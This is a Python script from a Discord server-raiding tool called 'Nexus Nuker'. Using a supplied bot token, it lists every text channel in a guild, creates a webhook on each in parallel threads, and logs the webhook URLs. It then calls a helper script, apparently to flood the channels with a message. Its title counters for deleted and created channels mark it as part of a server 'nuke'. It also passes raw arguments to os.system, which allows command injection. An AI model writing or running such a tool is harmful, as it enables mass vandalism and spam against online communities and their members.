import requests
import threading
import sys  
from colorama import Fore, Style
import os
import ctypes

count = 0

class Log:
    @staticmethod
    def err(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTRED_EX} ERROR {Fore.RESET}] {msg}')

    @staticmethod
    def succ(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTMAGENTA_EX}+{Fore.RESET}] {msg}')

    @staticmethod
    def console(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTMAGENTA_EX}-{Fore.RESET}] {msg}')

    @staticmethod
    def invalid(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTMAGENTA_EX} INVALID {Fore.RESET}] {msg}')


barrer_token = sys.argv[1]
guild_id = sys.argv[2]
Channel_delted2 = sys.argv[3]
Channel_created = sys.argv[4]
message = sys.argv[5]

def set_window_title(title):
    try:
        console_handle = ctypes.windll.kernel32.GetConsoleWindow()

        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except Exception as e:
        print(f'Error occurred while setting window title: {str(e)}')

def upodate_title():
    set_window_title(f"Nexus Nuker Channels Delted: {Channel_delted2} | Channels Created: {Channel_created} | Webhooks Created: {count}")

def create_webhook(channel_id):
    global count
    headers = {
        "Authorization": f"barrer {barrer_token}",
        "Content-Type": "application/json",
    }

    data = {
        "name": "Nexus Nuker"
    }

    response = requests.post(f"https://discord.com/api/v10/channels/{channel_id}/webhooks", json=data, headers=headers)

    if response.status_code == 200:
        webhook_data = response.json()
        webhook_url = webhook_data.get("url")
        count += 1
        os.system("cls")
        upodate_title()
        Log.succ(f'Deleted channel' + Fore.MAGENTA + f" {(Channel_delted2)}" + Fore.RESET)
        Log.succ(f"Channel created" + Fore.MAGENTA + f" {(Channel_created)}" + Fore.RESET )
        Log.succ(f'Webhooks Created' + Fore.MAGENTA + f" {(count)}" + Fore.RESET)
        with open('Output/Nuker/webhooks.txt', 'a', encoding="utf-8") as file:
            file.write(f'{webhook_url}\n')
    else:
        print(f"{response.status_code}")
        print(response.text)

def main():
    headers = {
        'Authorization': f'barrer {barrer_token}',
        'Content-Type': 'application/json',
    }

    with open('Output/Nuker/webhooks.txt', 'w', encoding="utf-8") as file:
        file.write("")

    response = requests.get(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers)

    if response.status_code == 200:
        channels = response.json()

        text_channel_ids = [channel['id'] for channel in channels if channel['type'] == 0]

        if text_channel_ids:
            threads = []
            for channel_id in text_channel_ids:
                thread = threading.Thread(target=create_webhook, args=(channel_id,))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()
        else:
            print("No text channels found in the guild.")
    else:
        print(f"Failed to fetch channels. Status code: {response.status_code}")

if __name__ == "__main__":
    main()
    os.system(f"py Helper/Plugs/DiscordNukerPlugs/funcs/send.py {Channel_delted2} {Channel_created} {count} {message}")
